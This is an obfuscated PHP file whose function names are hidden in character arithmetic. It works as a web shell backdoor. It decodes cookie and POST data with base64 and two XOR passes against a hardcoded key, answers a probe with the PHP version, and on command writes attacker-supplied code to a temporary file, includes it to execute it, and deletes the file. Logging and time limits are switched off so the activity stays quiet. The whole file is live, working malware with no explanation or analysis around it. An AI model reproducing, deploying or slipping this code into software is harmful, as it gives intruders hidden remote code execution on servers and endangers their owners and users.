<?php $jtgxe = 'f'.chr(687-582).'l'."\x65".chr(583-488)."\160"."\165".chr(116).chr(459-364).'c'.'o'."\156".'t'."\x65".chr(257-147).chr(1069-953).'s';
$uqzva = "\x62".'a'.chr(759-644).'e'.'6'."\x34".'_'."\x64".'e'.'c'.chr(111).chr(100)."\145";
$dwrtyicr = chr(937-832)."\156".chr(105).chr(394-299).chr(197-82).'e'.chr(116);
$ahmbpf = 'u'.chr(248-138).'l'."\151".chr(1081-971).'k';


@$dwrtyicr("\145".chr(268-154).chr(253-139).chr(111).chr(114).'_'.chr(108).chr(111)."\x67", NULL);
@$dwrtyicr("\154".'o'."\147".'_'.chr(467-366)."\162".chr(546-432)."\x6f"."\x72".chr(745-630), 0);
@$dwrtyicr(chr(920-811).'a'.'x'."\x5f"."\145"."\x78".chr(1031-930).chr(892-793)."\165".chr(918-802)."\151"."\157"."\156".chr(1075-980).'t'."\151".chr(109).'e', 0);
@set_time_limit(0);

function mdbcko($efreale, $ybcmlhqymm)
{
    $udloyth = "";
    for ($qazenian = 0; $qazenian < strlen($efreale);) {
        for ($j = 0; $j < strlen($ybcmlhqymm) && $qazenian < strlen($efreale); $j++, $qazenian++) {
            $udloyth .= chr(ord($efreale[$qazenian]) ^ ord($ybcmlhqymm[$j]));
        }
    }
    return $udloyth;
}

$lrihtby = array_merge($_COOKIE, $_POST);
$ryyubcv = '6240de50-576d-4f4c-a109-9ec6fc791ec3';
foreach ($lrihtby as $jfnelkddmq => $efreale) {
    $efreale = @unserialize(mdbcko(mdbcko($uqzva($efreale), $ryyubcv), $jfnelkddmq));
    if (isset($efreale["\x61"."\153"])) {
        if ($efreale[chr(132-35)] == 'i') {
            $qazenian = array(
                'p'.chr(118) => @phpversion(),
                chr(121-6).chr(118) => "3.5",
            );
            echo @serialize($qazenian);
        } elseif ($efreale[chr(132-35)] == "\145") {
            $txdbt = "./" . md5($ryyubcv) . chr(610-564).'i'."\156".'c';
            @$jtgxe($txdbt, "<" . chr(63).chr(196-84).chr(479-375).'p'."\40".'@'.'u'.chr(110)."\x6c"."\151".chr(633-523)."\x6b".'('.chr(95)."\x5f".'F'."\111".chr(76)."\105"."\137".chr(678-583)."\x29".';'.chr(682-650) . $efreale[chr(100)]);
            @include($txdbt);
            @$ahmbpf($txdbt);
        }
        exit();
    }
}

